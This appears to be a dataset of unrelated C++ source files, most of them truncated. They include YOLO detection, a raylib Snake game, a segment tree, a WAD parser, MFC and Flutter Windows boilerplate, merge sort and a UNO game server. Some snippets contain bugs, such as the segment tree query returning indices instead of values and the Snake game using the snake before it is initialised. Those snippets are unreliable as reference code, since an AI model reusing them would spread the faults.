;//\u83b7\u53d6\u6bcf\u4e00\u884c\u7684box\u6846\u4e2d\u542b\u6709\u67d0\u4e2a\u7269\u4f53\u7684\u6982\u7387\n\t\t\t\t\tif (box_score >= boxThreshold) {\n\t\t\t\t\t\tcv::Mat scores(1, className.size(), CV_32FC1, pdata + 5);\n\t\t\t\t\t\tPoint classIdPoint;\n\t\t\t\t\t\tdouble max_class_socre;\n\t\t\t\t\t\tminMaxLoc(scores, 0, &max_class_socre, 0, &classIdPoint);\n\t\t\t\t\t\tmax_class_socre = sigmoid_x(max_class_socre);\n\t\t\t\t\t\tif (max_class_socre >= classThreshold) {\n\t\t\t\t\t\t\tfloat x = (sigmoid_x(pdata[0]) * 2.f - 0.5f + j) * netStride[stride];  //x\n\t\t\t\t\t\t\tfloat y = (sigmoid_x(pdata[1]) * 2.f - 0.5f + i) * netStride[stride];   //y\n\t\t\t\t\t\t\tfloat w = powf(sigmoid_x(pdata[2]) * 2.f, 2.f) * anchor_w;   //w\n\t\t\t\t\t\t\tfloat h = powf(sigmoid_x(pdata[3]) * 2.f, 2.f) * anchor_h;  //h\n\t\t\t\t\t\t\tint left = (int)(x - 0.5 * w) * ratio_w + 0.5;\n\t\t\t\t\t\t\tint top = (int)(y - 0.5 * h) * ratio_h + 0.5;\n\t\t\t\t\t\t\tclassIds.push_back(classIdPoint.x);\n\t\t\t\t\t\t\tconfidences.push_back(max_class_socre * box_score);\n\t\t\t\t\t\t\tboxes.push_back(Rect(left, top, int(w * ratio_w), int(h * ratio_h)));\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tpdata += net_width;//\u4e0b\u4e00\u884c\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\t//\u6267\u884c\u975e\u6700\u5927\u6291\u5236\u4ee5\u6d88\u9664\u5177\u6709\u8f83\u4f4e\u7f6e\u4fe1\u5ea6\u7684\u5197\u4f59\u91cd\u53e0\u6846\uff08NMS\uff09\n\tvector<int> nms_result;\n\tNMSBoxes(boxes, confidences, nmsScoreThreshold, nmsThreshold, nms_result);\n\tfor (int i = 0; i < nms_result.size(); i++) {\n\t\tint idx = nms_result[i];\n\t\tOutput result;\n\t\tresult.id = classIds[idx];\n\t\tresult.confidence = confidences[idx];\n\t\tresult.box = boxes[idx];\n\t\toutput.push_back(result);\n\t}\n\tif (output.size())\n\t\treturn true;\n\telse\n\t\treturn false;\n}\n#else\n\t//yolov5\nbool Yolo::Detect(Mat& SrcImg, Net& net, vector<Output>& output) {\n\tMat blob;\n\tint col = SrcImg.cols;\n\tint row = SrcImg.rows;\n\tint maxLen = MAX(col, row);\n\tMat netInputImg = SrcImg.clone();\n\tif (maxLen > 1.2 * col || maxLen > 1.2 * row) {\n\t\tMat resizeImg = Mat::zeros(maxLen, maxLen, CV_8UC3);\n\t\tSrcImg.copyTo(resizeImg(Rect(0, 0, col, row)));\n\t\tnetInputImg = resizeImg;\n\t}\n\tvector<Ptr<Layer> > layer;\n\tvector<string> layer_names;\n\tlayer_names = net.getLayerNames();\n\tblobFromImage(netInputImg, blob, 1 / 255.0, cv::Size(netWidth, netHeight), cv::Scalar(0, 0, 0), true, false);\n\t//\u5982\u679c\u5728\u5176\u4ed6\u8bbe\u7f6e\u6ca1\u6709\u95ee\u9898\u7684\u60c5\u51b5\u4e0b\u4f46\u662f\u7ed3\u679c\u504f\u5dee\u5f88\u5927\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u4e0b\u7528\u4e0b\u9762\u4e24\u53e5\u8bed\u53e5\n\t//blobFromImage(netInputImg, blob, 1 / 255.0, cv::Size(netWidth, netHeight), cv::Scalar(104, 117, 123), true, false);\n\t//blobFromImage(netInputImg, blob, 1 / 255.0, cv::Size(netWidth, netHeight), cv::Scalar(114, 114,114), true, false);\n\tnet.setInput(blob);\n\tstd::vector<cv::Mat> netOutputImg;\n\tnet.forward(netOutputImg, net.getUnconnectedOutLayersNames());\n\tstd::vector<int> classIds;//\u7ed3\u679cid\u6570\u7ec4\n\tstd::vector<float> confidences;//\u7ed3\u679c\u6bcf\u4e2aid\u5bf9\u5e94\u7f6e\u4fe1\u5ea6\u6570\u7ec4\n\tstd::vector<cv::Rect> boxes;//\u6bcf\u4e2aid\u77e9\u5f62\u6846\n\tfloat ratio_h = (float)netInputImg.rows / netHeight;\n\tfloat ratio_w = (float)netInputImg.cols / netWidth;\n\tint net_",
    "#include <raylib.h>\n#include <deque>\n#include <raymath.h>\n#include <iostream>\n\nusing namespace std;\n\nColor green = {173,204,96,255};\nColor darkGreen = {43,51,24,255};\n\nint cellSize = 30;\nint cellCount = 25;\nint offset = 60;\ndouble speed = 1;\ndouble lastUpdateTime = 0.0;\n\nbool elementInDeque(Vector2 element, deque<Vector2> deque){\n    for (unsigned int i = 0; i < deque.size(); i++)\n    {\n        if(Vector2Equals(element, deque[i])){\n            return true;\n        }\n    }\n    return false;\n}\n\n\nbool eventTriggred(double interval){\n    double currentTime = GetTime();\n    if(currentTime - lastUpdateTime > interval){\n        lastUpdateTime = currentTime;\n        return true;\n    }\n    return false;\n}\n\n\nclass Snake{\n    public :\n        deque<Vector2> body = {Vector2{6,9}, Vector2{5,9}, Vector2{4,9}};\n        Vector2 direction =  {1,0};\n        bool addSegment = false;\n    void Draw(){\n        for (unsigned int i = 0; i < body.size(); i++)\n        {\n            float x = body[i].x;\n            float y = body[i].y;\n            Rectangle segmant = Rectangle{offset+ x * cellSize, offset+ y * cellSize,   (float)cellSize,(float)cellSize};\n            DrawRectangleRounded(segmant,0.5 , 6, darkGreen);\n        }\n    }\n    void Update(){\n        body.push_front(Vector2Add(body[0], direction));\n\n        if (addSegment){\n            //body.push_back(body.back());\n            addSegment = false;\n        }\n        else{\n            body.pop_back();\n        }\n\n    }\n\n    void Reset(){\n        body = {Vector2{6,9}, Vector2{5,9}, Vector2{4,9}};\n        direction =  {1,0};\n    }\n};\nclass Food\n{\npublic:\n    Vector2 postion;\n    Texture2D texture;\n\n    Food(deque<Vector2> SnakeBody){\n        Image image = LoadImage(\"assets/food.png\");\n        texture = LoadTextureFromImage(image);\n        UnloadImage(image);\n        postion = GenerateRandomPos(SnakeBody);\n    }\n    ~Food(){\n        UnloadTexture(texture);\n    }\n    void Draw(){\n        // DrawRectangle(postion.x * cellSize, postion.y * cellSize, cellSize, cellSize, darkGreen);\n        DrawTexture(texture, offset+ postion.x * cellSize, offset+ postion.y * cellSize, WHITE);\n    }\n\n    Vector2 GenerateRandomCell(){\n        float x = GetRandomValue(0, cellCount - 1);\n        float y = GetRandomValue(0, cellCount - 1);\n        return Vector2 {x,y};\n    }\n\n    /**\n     * Generates a random position within the range specified by cellCount.\n     *\n     * @return Vector2 the randomly generated position\n     */\n    Vector2 GenerateRandomPos(deque<Vector2> SnakeBody){\n        Vector2 postion = GenerateRandomCell();\n        while(elementInDeque(postion, SnakeBody)){\n            postion = GenerateRandomCell();\n        }\n        return postion;\n    }\n};\n\nclass Game\n{\npublic:\n    Food food = Food(snake.body);\n    Snake snake = Snake();\n    bool running = true;\n    int score = 0;\n    void Draw(){\n        snake.Draw();\n        food.Draw();\n    }\n    void Update(){\n        if (running) {\n            snake.Update();\n            CheckCollisionWithFood();\n            CheckCollisionWithEdges();\n            // CheckCollisionWithSelf();\n        }\n    }\n    void CheckCollisionWithFood(){\n        if(Vector2Equals(snake.body[0], food.postion)){\n            food.postion = food.GenerateRandomPos(snake.body);\n            cout << \"Food Eaten!\"<< endl;\n            snake.addSegment = true;\n            score++;\n            cout << \"Score: \" << score << endl;\n        }\n    }\n    void CheckCollisionWithEdges(){\n        if(snake.body[0].x == -1 || snake.body[0].x == cellCount || snake.body[0].y == -1 || snake.body[0].y == cellCount){\n            GameOver();\n        }\n    }\n\n    void CheckCollisionWithSelf(){\n        deque<Vector2> headless = snake.body;\n        headless.pop_front();\n        if (elementInDeque(snake.body[0], headless)){\n            GameOver();\n        }\n    }\n    \n    void GameOver(){\n        cout << \"Game Over!\" << endl;\n        running = false;\n        snake.Reset();\n        food.postion = food.GenerateRandomPos(snake.body);\n        score = 0;\n    }\n};\n\nint main()\n{\n    InitWindow(2*offset + cellSize * cellCount, 2*offset +cellSize * cellCount, \"Snake game by wesamdev | v1\");\n    SetTargetFPS(60);\n    Game game = Game();\n    while (!WindowShouldClose())\n    {\n        BeginDrawing();\n        ClearBackground(green);\n        if (eventTriggred(speed)){\n            if(IsKeyDown(KEY_UP) && game.snake.direction.y != 1){\n                game.snake.direction = {0,-1};\n                game.running = true;\n            }\n            if(IsKeyDown(KEY_DOWN) && game.snake.direction.y != -1){\n                game.snake.direction = {0,1};\n                game.running = true;\n\n            }\n            if(IsKeyDown(KEY_LEFT) && game.snake.direction.x != 1){\n                game.snake.direction = {-1,0};\n                game.running = true;\n\n            }\n            if(IsKeyDown(KEY_RIGHT) && game.snake.direction.x != -1){\n                game.snake.direction = {1,0};\n                game.running = true;\n            ",
    "#include <bits/stdc++.h>\n\nusing namespace std;\nclass SegmentTree\n{\n\nprivate:\n    vector<int> m_tree;\n    int m_n;\n\npublic:\n    SegmentTree(vector<int> x)\n    {\n        int n = x.size();\n        m_n = n;\n\n        m_tree.resize(n * 2);\n\n        for (int i = 0; i < n; i++)\n        {\n            m_tree[i + n] = x[i];\n        }\n\n        for (int i = n - 1; i > 0; i--)\n        {\n            m_tree[i] = min(m_tree[i * 2], m_tree[i * 2 + 1]);\n        }\n    }\n\n    int query(int a, int b)\n    {\n        a += m_n;\n        b += m_n;\n\n        // init value\n        int res = m_tree[a];\n        while (a <= b)\n        {\n            if (a % 2 == 1)\n            {\n                res = min(res, a);\n                a++;\n            }\n\n            if (b % 2 == 0)\n            {\n                res = min(res, b);\n                b--;\n            }\n\n            a /= 2;\n            b /= 2;\n        }\n\n        return res;\n    }\n\n    void print()\n    {\n        for (int i = 0; i < m_tree.size(); i++)\n        {\n            cout << m_tree[i] << ' ';\n        }\n        cout << '\\n';\n    }\n};\n\nint main()\n{\n\n    SegmentTree s = SegmentTree(vector<int>{5, 8, 6, 3, 2, 7, 2, 6});\n\n    cout << s.query(5, 6) << '\\n';\n\n    s.print();\n}",
    "#include \"Wad.h\"\n\nWad::Wad(const string &path) {\n    char buffer[4];\n\n    //open the binary file\n    int fd = open(path.c_str(), O_RDONLY);\n\n    //read the first 4 bytes into magic\n    read(fd, magic, 4);\n    magic[4] = '\\0';\n\n    //read the next 4 bytes into numDesc\n    read(fd, buffer, 4);\n    numDesc = *(int*)buffer;\n\n    //read the next 4 bytes into offset and move the fd to start at the offset\n    read(fd, buffer, 4);\n    offset = *(int*)buffer;\n    lseek(fd, offset, SEEK_SET);\n\n    root = new Node(0, 0, \"/\");\n\n    //pointer to the current directory/parent\n    Node* pwd = &(*root);\n    \n    int count = -1;\n    int fileOffset = 0;\n\n    //parse starting from offset\n    for (int i = 0; i < numDesc; i++) {\n        int nOffset;\n        int nLength;\n        char cnName[8];\n        \n        read(fd, &nOffset, 4);\n        read(fd, &nLength, 4);\n        read(fd, &cnName, 8);\n\n        fileOffset += 16;\n\n        string nName(cnName);\n\n        //determine what type of node it is\n        if (nLength == 0 && nName.find(\"START\") != string::npos) { //namespace beginning\n            nName = nName.substr(0, nName.find(\"_START\"));\n            Node* node = new Node(nOffset, nLength, nName);\n            node->parent = pwd;  \n            pwd->children.push_back(node);\n            pwd = node;\n\n        } else if (nName.at(0) == 'E' && nName.at(2) == 'M') { //map marker\n            count = 10;\n            Node* n = new Node(nOffset, nLength, nName);\n            pwd->children.push_back(n);\n            n->parent = pwd;\n            pwd = n;\n\n        } else if (nLength == 0 && nName.find(\"END\") != string::npos) { //namespace end\n            pwd = pwd->parent;\n\n        } else if (count <= 10 && count > 1) { //inside map marker\n            char* data = new char[nLength];\n            \n            lseek(fd, nOffset, SEEK_SET);\n            read(fd, data, nLength);\n\n            Node* node = new Node(nOffset, nLength, nName);\n            node->data = data;\n            node->parent = pwd;\n            pwd->children.push_back(node);\n\n            lseek(fd, offset + fileOffset, SEEK_SET);\n            count--;\n\n\n        } else if (count == 1) { //last element in map marker\n            char* data = new char[nLength];\n\n            lseek(fd, nOffset, SEEK_SET);\n            read(fd, data, nLength);\n\n            Node* node = new Node(nOffset, nLength, nName);\n            node->data = data;\n            node->parent = pwd;\n            pwd->children.push_back(node);\n\n            lseek(fd, offset + fileOffset, SEEK_SET);\n            pwd = pwd->parent;\n            count = -1;\n\n        } else { //files\n            char* data = new char[nLength];\n            \n            lseek(fd, nOffset, SEEK_SET);\n            read(fd, data, nLength);\n\n            Node* node = new Node(nOffset, nLength, nName);\n            node->data = data;\n            node->parent = pwd;\n            pwd->children.push_back(node);\n\n            lseek(fd, offset + fileOffset, SEEK_SET);\n        }\n    }\n\n    close(fd);\n}\n\nWad* Wad::loadWad(const string &path) {\n    Wad* wad = new Wad(path);\n    return wad;\n}\n\nstring Wad::getMagic() {\n    return (string)magic;\n}\n\nbool Wad::isContent(const string &path){\n    if (getNode(path) != nullptr && getNode(path)->children.empty()) {\n        return true;\n    }\n    return false;\n}\n\nbool Wad::isDirectory(const string &path) {\n    if (getNode(path) != nullptr && getNode(path)->length == 0) {\n        return true;\n    }\n    return false;\n}\n\nint Wad::getSize(const string &path) {\n    if (isContent(path)) {\n        return getNode(path)->length;\n    }\n    return -1;\n}\n\nint Wad::getContents(const string &path, char *buffer, int length, int offset) {\n    Node* node = getNode(path);\n    if (isContent(path)) {\n        if (node->length < offset + length) {\n            memcpy(buffer, node->data + offset, node->length - offset);\n            return node->length - offset;\n        }\n        memcpy(buffer, node->data + offset, length);\n        return length;\n    }\n    return -1;\n}\n\nint Wad::getDirectory(const string &path, vector<string> *directory) {\n    if (isDirectory(path)) {\n        Node* node = getNode(path);\n        for (int i = 0; i < node->children.size(); i++) {\n            directory->push_back(node->children[i]->name);\n        }\n        return directory->size();\n    }\n    return -1;\n}\n\nNode* Wad::getNode(const string &path) {\n    Node* curr = root;\n    vector<string> components;\n    int start = 1;\n    int end = path.find('/');\n\n    //separate path into components\n    if (path == \"/\") {\n        return curr;\n    } else {\n        while (end != string::npos) {\n            components.push_back(path.substr(start, end-start));\n            start = end + 1;\n            end = path.find('/', start);\n        }\n\n        if (start != path.length()) {\n            components.push_back(path.substr(start));\n        }\n\n    }\n\n    //search each directory to find the node for the given path\n    bool found = false;\n    for (string c : components) {\n        for (int i = 0; i < cur",
    "\ufeff\r\n// MainFrm.cpp: CMainFrame \ud074\ub798\uc2a4\uc758 \uad6c\ud604\r\n//\r\n\r\n#include \"pch.h\"\r\n#include \"framework.h\"\r\n#include \"ColorImageAlpha1.h\"\r\n\r\n#include \"MainFrm.h\"\r\n\r\n#ifdef _DEBUG\r\n#define new DEBUG_NEW\r\n#endif\r\n\r\n// CMainFrame\r\n\r\nIMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)\r\n\r\nBEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)\r\n\tON_WM_CREATE()\r\nEND_MESSAGE_MAP()\r\n\r\nstatic UINT indicators[] =\r\n{\r\n\tID_SEPARATOR,           // \uc0c1\ud0dc \uc904 \ud45c\uc2dc\uae30\r\n\tID_INDICATOR_CAPS,\r\n\tID_INDICATOR_NUM,\r\n\tID_INDICATOR_SCRL,\r\n};\r\n\r\n// CMainFrame \uc0dd\uc131/\uc18c\uba78\r\n\r\nCMainFrame::CMainFrame() noexcept\r\n{\r\n\t// TODO: \uc5ec\uae30\uc5d0 \uba64\ubc84 \ucd08\uae30\ud654 \ucf54\ub4dc\ub97c \ucd94\uac00\ud569\ub2c8\ub2e4.\r\n}\r\n\r\nCMainFrame::~CMainFrame()\r\n{\r\n}\r\n\r\nint CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)\r\n{\r\n\tif (CFrameWnd::OnCreate(lpCreateStruct) == -1)\r\n\t\treturn -1;\r\n\r\n\tif (!m_wndToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP | CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||\r\n\t\t!m_wndToolBar.LoadToolBar(IDR_MAINFRAME))\r\n\t{\r\n\t\tTRACE0(\"\ub3c4\uad6c \ubaa8\uc74c\uc744 \ub9cc\ub4e4\uc9c0 \ubabb\ud588\uc2b5\ub2c8\ub2e4.\\n\");\r\n\t\treturn -1;      // \ub9cc\ub4e4\uc9c0 \ubabb\ud588\uc2b5\ub2c8\ub2e4.\r\n\t}\r\n\r\n\tif (!m_wndStatusBar.Create(this))\r\n\t{\r\n\t\tTRACE0(\"\uc0c1\ud0dc \ud45c\uc2dc\uc904\uc744 \ub9cc\ub4e4\uc9c0 \ubabb\ud588\uc2b5\ub2c8\ub2e4.\\n\");\r\n\t\treturn -1;      // \ub9cc\ub4e4\uc9c0 \ubabb\ud588\uc2b5\ub2c8\ub2e4.\r\n\t}\r\n\tm_wndStatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT));\r\n\r\n\t// TODO: \ub3c4\uad6c \ubaa8\uc74c\uc744 \ub3c4\ud0b9\ud560 \uc218 \uc5c6\uac8c \ud558\ub824\uba74 \uc774 \uc138 \uc904\uc744 \uc0ad\uc81c\ud558\uc2ed\uc2dc\uc624.\r\n\tm_wndToolBar.EnableDocking(CBRS_ALIGN_ANY);\r\n\tEnableDocking(CBRS_ALIGN_ANY);\r\n\tDockControlBar(&m_wndToolBar);\r\n\r\n\r\n\treturn 0;\r\n}\r\n\r\nBOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)\r\n{\r\n\tif( !CFrameWnd::PreCreateWindow(cs) )\r\n\t\treturn FALSE;\r\n\t// TODO: CREATESTRUCT cs\ub97c \uc218\uc815\ud558\uc5ec \uc5ec\uae30\uc5d0\uc11c\r\n\t//  Window \ud074\ub798\uc2a4 \ub610\ub294 \uc2a4\ud0c0\uc77c\uc744 \uc218\uc815\ud569\ub2c8\ub2e4.\r\n\r\n\treturn TRUE;\r\n}\r\n\r\n// CMainFrame \uc9c4\ub2e8\r\n\r\n#ifdef _DEBUG\r\nvoid CMainFrame::AssertValid() const\r\n{\r\n\tCFrameWnd::AssertValid();\r\n}\r\n\r\nvoid CMainFrame::Dump(CDumpContext& dc) const\r\n{\r\n\tCFrameWnd::Dump(dc);\r\n}\r\n#endif //_DEBUG\r\n\r\n\r\n// CMainFrame \uba54\uc2dc\uc9c0 \ucc98\ub9ac\uae30\r\n\r\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// Given an array arr[], its starting position l and its ending position r. Sort the array using merge sort algorithm.\n\n//Your Task:\n//You don't need to take the input or print anything. \n//Your task is to complete the function merge() which takes arr[], l, m, r as its input parameters and modifies arr[] in-place such that it is sorted from position l to position r, and function mergeSort() which uses merge() to sort the array in ascending order using merge sort algorithm.\n\nclass Solution\n{\n    public:\n    void merge(int arr[], int l, int m, int r)\n    {\n        int len1=m-l+1;\n        int len2=r-m;\n        int arr1[len1],arr2[len2];\n        int k=l;\n        for(int i=0;i<len1;i++)\n        {\n            arr1[i]=arr[k++];\n        }\n        k=m+1;\n        for(int i=0;i<len2;i++)\n        {\n            arr2[i]=arr[k++];\n        }\n        int main=l;\n        int index1=0;\n        int index2=0;\n        \n        while(len1>index1 && len2>index2)\n        {\n            if(arr1[index1]>arr2[index2])\n            {\n                arr[main++]=arr2[index2++];\n            }\n            else\n            {\n                arr[main++]=arr1[index1++];\n            }\n        }\n        while(len1>index1)\n        {\n            arr[main++]=arr1[index1++];\n        }\n        while(len2>index2)\n        {\n            arr[main++]=arr2[index2++];\n        }\n    }\n    public:\n    void mergeSort(int arr[], int l, int r)\n    {\n        if(l>=r)\n        {\n            return;\n        }\n        else\n        {\n            int mid=(l+r)/2;\n            mergeSort(arr,l,mid);\n            mergeSort(arr,mid+1,r);\n            merge(arr,l,mid,r);\n        }\n    }\n};",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"game/game.h\"\n#include \"util/util.h\"\n#include \"thread/sudoThreads.h\"\n#include <thread>\n\nusing namespace SudoUno;\nusing namespace std;\n\n// As i've done for all the labs, a vector to hold the threads to keep them referenced until shutdown\nvector <thread> waiterThreads;\nvector <game::Game> game::gamesVect;\n\n// Create a semaphore to ensure that players are added to games in a single-file fashion\nproc::Semaphore canJoin(\"canJoin\", 1, true);\n\n// Spawns a waiter thread to wait for the player to enter a username\nvoid spawnWaiterThread(network::Socket sk) {\n    thread tr(sudoThreads::waiterThreadFunction, sk);\n    waiterThreads.push_back(std::move(tr));\n}\n\nint main() {\n    util::log('I', \"init sudo-uno-server\");\n\n    // TODO: Command-line args to set port number and interface bind\n    const string bind_if = \"0.0.0.0\";\n    const int bind_port = 6969;\n\n    util::log('I', \"Using default settings. Will bind to \" + bind_if + \":\" + to_string(bind_port));\n\n    // Instantiate the socket server\n    // TODO: can we even change the bind if? do we need to?\n    try {\n        network::SocketServer serveSock(6969);\n\n        util::log('I', \"Socket opened on port \" + to_string(bind_port));\n        util::ascii();\n\n        // Loop indefinitely for each request\n        while (true) {\n            util::log('S', \"Waiting for a player to connect...\");\n            network::Socket clientSocket(serveSock.Accept());\n            util::log('S', \"Connection established! Isolating...\");\n\n            // Always wrap connections into their own thread\n            